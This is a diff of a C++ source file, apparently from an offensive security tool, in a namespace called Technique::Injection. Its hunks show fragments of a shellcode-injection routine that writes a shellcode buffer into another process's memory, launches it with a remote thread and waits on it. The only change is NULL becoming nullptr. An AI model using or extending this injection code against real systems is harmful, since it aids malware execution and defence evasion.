@@ -33,7 +33,7 @@ namespace Technique::Injection
             pBaseAddr,
             (LPVOID)shellcode.data(),
             shellcode.size(),
-            NULL
+            nullptr
         )) {
             System::Process::VirtualMemoryFree(
                 pProcs,
@@ -50,7 +50,7 @@ namespace Technique::Injection
             pProcs,
             hProcess,
             (LPTHREAD_START_ROUTINE)pBaseAddr,
-            NULL
+            nullptr
         );
         if (!hThread)
         {
@@ -65,7 +65,7 @@ namespace Technique::Injection
             return FALSE;
         }
 
-        pProcs->lpNtWaitForSingleObject(hThread, FALSE, NULL);
+        pProcs->lpNtWaitForSingleObject(hThread, FALSE, nullptr);
 
         pProcs->lpNtClose(hProcess);
         pProcs->lpNtClose(hThread);
